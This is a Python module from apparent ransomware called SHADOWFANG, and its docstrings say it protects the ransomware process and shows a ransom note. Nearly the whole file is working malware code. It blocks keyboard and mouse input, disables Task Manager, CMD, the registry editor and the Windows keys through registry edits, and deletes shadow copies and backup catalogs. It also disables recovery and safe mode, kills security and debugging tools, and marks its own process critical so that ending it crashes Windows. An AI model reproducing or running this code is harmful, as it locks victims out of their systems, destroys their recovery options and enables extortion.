#!/usr/bin/env python3
"""
SHADOWFANG CORE - LOCKER.PY
Complete system lockdown module
Keyboard/mouse blocking, screen lock, system restrictions, boot prevention
"""

import os
import sys
import time
import ctypes
import winreg
import subprocess
import threading
from ctypes import wintypes
from core import CoreUtils, WinAPI, Constants, logger

# ==================== INPUT LOCKER ====================

class InputLocker:
    """Block keyboard and mouse input"""
    
    def __init__(self):
        self.input_blocked = False
        self.block_thread = None
        self.stop_blocking = False
    
    def block_input(self):
        """Block all keyboard and mouse input"""
        try:
            result = WinAPI.user32.BlockInput(True)
            if result:
                self.input_blocked = True
                logger.info("Keyboard and mouse input blocked")
            return result
        except Exception as e:
            logger.error(f"Input blocking failed: {e}")
            return False
    
    def unblock_input(self):
        """Unblock keyboard and mouse input"""
        try:
            result = WinAPI.user32.BlockInput(False)
            if result:
                self.input_blocked = False
                logger.info("Input unblocked")
            return result
        except:
            return False
    
    def start_persistent_block(self):
        """Start persistent input blocking in background thread"""
        if self.block_thread and self.block_thread.is_alive():
            return True
        
        self.stop_blocking = False
        
        def block_worker():
            while not self.stop_blocking:
                try:
                    WinAPI.user32.BlockInput(True)
                    time.sleep(0.1)
                except:
                    break
        
        self.block_thread = threading.Thread(target=block_worker)
        self.block_thread.daemon = True
        self.block_thread.start()
        
        logger.info("Persistent input blocking started")
        return True
    
    def stop_persistent_block(self):
        """Stop persistent input blocking"""
        self.stop_blocking = True
        if self.block_thread:
            self.block_thread.join(timeout=2)
        self.unblock_input()
        logger.info("Persistent input blocking stopped")
    
    def disable_ctrl_alt_del(self):
        """Disable Ctrl+Alt+Del"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableChangePassword", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def disable_alt_f4(self):
        """Disable Alt+F4"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def disable_windows_keys(self):
        """Disable Windows keys"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Keyboard Layout"
            )
            # Scancode map to disable Windows keys
            scancode_map = bytes([
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0xE0,
                0x00, 0x00, 0x5C, 0xE0, 0x00, 0x00, 0x00, 0x00
            ])
            winreg.SetValueEx(key, "Scancode Map", 0, winreg.REG_BINARY, scancode_map)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def lock_all_input(self):
        """Lock all input methods"""
        methods = [
            self.block_input,
            self.disable_ctrl_alt_del,
            self.disable_alt_f4,
            self.disable_windows_keys
        ]
        
        success = 0
        for method in methods:
            try:
                if method():
                    success += 1
            except:
                continue
        
        logger.info(f"Input lock complete: {success}/{len(methods)} methods succeeded")
        return success > 0

# ==================== SCREEN LOCKER ====================

class ScreenLocker:
    """Lock screen and display ransom note"""
    
    def __init__(self):
        self.lock_window = None
        self.lock_thread = None
        self.screen_locked = False
    
    def create_fullscreen_window(self, message=None):
        """Create fullscreen unclosable window"""
        try:
            import tkinter as tk
            from tkinter import font as tkfont
            
            self.lock_window = tk.Tk()
            self.lock_window.attributes('-fullscreen', True)
            self.lock_window.attributes('-topmost', True)
            self.lock_window.overrideredirect(True)
            self.lock_window.configure(bg='black')
            self.lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            # Prevent window from losing focus
            self.lock_window.bind('<FocusOut>', lambda e: self.lock_window.focus_force())
            self.lock_window.bind('<Button-1>', lambda e: self.lock_window.focus_force())
            
            # Disable keyboard shortcuts
            self.lock_window.bind('<Alt-F4>', lambda e: 'break')
            self.lock_window.bind('<Control-Alt-Delete>', lambda e: 'break')
            self.lock_window.bind('<Alt-Tab>', lambda e: 'break')
            self.lock_window.bind('<Escape>', lambda e: 'break')
            
            # Create content
            if message:
                label = tk.Label(
                    self.lock_window,
                    text=message,
                    font=('Consolas', 16),
                    fg='red',
                    bg='black',
                    justify='center',
                    wraplength=900
                )
                label.pack(expand=True)
            
            self.screen_locked = True
            logger.info("Fullscreen lock window created")
            return True
        except Exception as e:
            logger.error(f"Screen lock failed: {e}")
            return False
    
    def start_screen_lock(self, message=None):
        """Start screen lock in background thread"""
        if self.screen_locked:
            return True
        
        def lock_worker():
            self.create_fullscreen_window(message)
            if self.lock_window:
                self.lock_window.mainloop()
        
        self.lock_thread = threading.Thread(target=lock_worker)
        self.lock_thread.daemon = True
        self.lock_thread.start()
        
        time.sleep(1)  # Wait for window to appear
        
        return self.screen_locked
    
    def change_wallpaper(self, text=None):
        """Change desktop wallpaper with ransom message"""
        try:
            import ctypes
            from PIL import Image, ImageDraw, ImageFont
            
            # Create wallpaper image
            width, height = 1920, 1080
            image = Image.new('RGB', (width, height), 'black')
            draw = ImageDraw.Draw(image)
            
            if text:
                # Draw text on image
                font = ImageFont.truetype("arial.ttf", 48)
                draw.text((width//2, height//2), text, fill='red', font=font, anchor='mm')
            
            # Save temporary wallpaper
            wallpaper_path = os.path.join(
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'shadowfang_wallpaper.bmp'
            )
            image.save(wallpaper_path)
            
            # Set as wallpaper
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
            
            logger.info("Wallpaper changed")
            return True
        except:
            return False
    
    def lock_workstation(self):
        """Lock workstation"""
        try:
            WinAPI.user32.LockWorkStation()
            return True
        except:
            return False

# ==================== SYSTEM RESTRICTOR ====================

class SystemRestrictor:
    """Disable system features and tools"""
    
    def __init__(self):
        self.restrictions_applied = False
    
    def disable_task_manager(self):
        """Disable Task Manager"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            # Also disable for all users
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_cmd(self):
        """Disable Command Prompt"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_registry_editor(self):
        """Disable Registry Editor"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_run_dialog(self):
        """Disable Run dialog"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_control_panel(self):
        """Disable Control Panel"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def hide_drives(self):
        """Hide all drives from Explorer"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            # Hide all drives (A-Z)
            winreg.SetValueEx(key, "NoDrives", 0, winreg.REG_DWORD, 0x3FFFFFF)
            winreg.SetValueEx(key, "NoViewOnDrive", 0, winreg.REG_DWORD, 0x3FFFFFF)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_taskbar(self):
        """Disable taskbar"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoSetTaskbar", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_start_menu(self):
        """Disable Start Menu"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoStartMenu", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_desktop(self):
        """Hide desktop icons"""
        try:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoDesktop", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def disable_system_restore(self):
        """Disable System Restore"""
        try:
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f'
            ]
            
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            return True
        except:
            return False
    
    def disable_safe_mode(self):
        """Disable Safe Mode boot"""
        try:
            commands = [
                'bcdedit /set {default} bootmenupolicy legacy',
                'bcdedit /set {default} safeboot minimal',
                'bcdedit /set {default} recoveryenabled No',
                'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
                'reagentc /disable'
            ]
            
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            return True
        except:
            return False
    
    def destroy_recovery_options(self):
        """Destroy Windows recovery options"""
        try:
            commands = [
                'vssadmin delete shadows /all /quiet',
                'wmic shadowcopy delete',
                'wbadmin delete catalog -quiet',
                'bcdedit /set {default} recoveryenabled No',
                'schtasks /Change /TN "Microsoft\\Windows\\SystemRestore\\SR" /Disable'
            ]
            
            for cmd in commands:
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            return True
        except:
            return False
    
    def kill_security_processes(self):
        """Kill security-related processes"""
        security_processes = [
            'taskmgr.exe',
            'regedit.exe',
            'cmd.exe',
            'powershell.exe',
            'msconfig.exe',
            'procexp.exe',
            'processhacker.exe',
            'procmon.exe',
            'wireshark.exe',
            'ollydbg.exe',
            'x64dbg.exe',
            'ida.exe',
            'ida64.exe'
        ]
        
        try:
            for proc in security_processes:
                subprocess.run(
                    f'taskkill /F /IM {proc}',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    def apply_all_restrictions(self):
        """Apply all system restrictions"""
        restrictions = [
            self.disable_task_manager,
            self.disable_cmd,
            self.disable_registry_editor,
            self.disable_run_dialog,
            self.disable_control_panel,
            self.hide_drives,
            self.disable_taskbar,
            self.disable_start_menu,
            self.disable_desktop,
            self.disable_system_restore,
            self.disable_safe_mode,
            self.destroy_recovery_options,
            self.kill_security_processes
        ]
        
        success = 0
        for restriction in restrictions:
            try:
                if restriction():
                    success += 1
            except:
                continue
        
        self.restrictions_applied = True
        logger.info(f"System restrictions applied: {success}/{len(restrictions)}")
        return success

# ==================== PROCESS PROTECTOR ====================

class ProcessProtector:
    """Protect ransomware process from termination"""
    
    def __init__(self):
        self.protected = False
        self.protection_thread = None
        self.stop_protection = False
    
    def set_critical_process(self):
        """Set process as critical - BSOD if killed"""
        try:
            process_handle = WinAPI.get_current_process_handle()
            WinAPI.ntdll.RtlSetProcessIsCritical(1, None, 0)
            self.protected = True
            logger.info("Process set as critical (BSOD on kill)")
            return True
        except:
            return False
    
    def protect_process(self):
        """Start process protection in background thread"""
        if self.protection_thread and self.protection_thread.is_alive():
            return True
        
        self.stop_protection = False
        
        def protection_worker():
            while not self.stop_protection:
                try:
                    # Keep process critical
                    WinAPI.ntdll.RtlSetProcessIsCritical(1, None, 0)
                    
                    # Kill any process trying to terminate us
                    self._kill_threat_processes()
                    
                    time.sleep(1)
                except:
                    break
        
        self.protection_thread = threading.Thread(target=protection_worker)
        self.protection_thread.daemon = True
        self.protection_thread.start()
        
        return True
    
    def _kill_threat_processes(self):
        """Kill processes that might threaten ransomware"""
        threat_processes = [
            'taskmgr.exe',
            'procexp.exe',
            'processhacker.exe',
            'procmon.exe'
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in [p.lower() for p in threat_processes]:
                    proc.kill()
        except:
            pass
    
    def hide_process(self):
        """Attempt to hide process from task manager"""
        try:
            # Set process priority to hide from task manager
            import ctypes
            process_handle = WinAPI.get_current_process_handle()
            
            # Set process as system process
            WinAPI.kernel32.SetPriorityClass(process_handle, 0x00000100)  # REALTIME_PRIORITY_CLASS
            
            return True
        except:
            return False

# ==================== MAIN LOCKER ====================

class SystemLocker:
    """Main system lockdown orchestrator"""
    
    def __init__(self):
        self.input_locker = InputLocker()
        self.screen_locker = ScreenLocker()
        self.system_restrictor = SystemRestrictor()
        self.process_protector = ProcessProtector()
        self.system_locked = False
    
    def lock_system(self, ransom_message=None):
        """Lock entire system"""
        logger.info("Starting full system lockdown...")
        
        # Phase 1: Protect process
        logger.info("Phase 1: Process protection")
        self.process_protector.set_critical_process()
        self.process_protector.protect_process()
        self.process_protector.hide_process()
        
        # Phase 2: Block input
        logger.info("Phase 2: Input blocking")
        self.input_locker.lock_all_input()
        self.input_locker.start_persistent_block()
        
        # Phase 3: System restrictions
        logger.info("Phase 3: System restrictions")
        self.system_restrictor.apply_all_restrictions()
        
        # Phase 4: Screen lock
        logger.info("Phase 4: Screen lock")
        if ransom_message:
            self.screen_locker.start_screen_lock(ransom_message)
        
        # Phase 5: Wallpaper change
        logger.info("Phase 5: Wallpaper change")
        self.screen_locker.change_wallpaper()
        
        self.system_locked = True
        logger.info("System lockdown complete")
        
        return True
    
    def unlock_system(self):
        """Unlock system (for decryption)"""
        logger.info("Unlocking system...")
        
        # Unblock input
        self.input_locker.stop_persistent_block()
        self.input_locker.unblock_input()
        
        # Stop process protection
        self.process_protector.stop_protection = True
        
        self.system_locked = False
        logger.info("System unlocked")
        
        return True
    
    def get_lock_status(self):
        """Get system lock status"""
        return {
            'system_locked': self.system_locked,
            'input_blocked': self.input_locker.input_blocked,
            'screen_locked': self.screen_locker.screen_locked,
            'process_protected': self.process_protector.protected,
            'restrictions_applied': self.system_restrictor.restrictions_applied
        }

# ==================== SINGLETON INSTANCE ====================

system_locker = SystemLocker()

# ==================== EXPORT ====================

__all__ = [
    'InputLocker',
    'ScreenLocker',
    'SystemRestrictor',
    'ProcessProtector',
    'SystemLocker',
    'system_locker'
]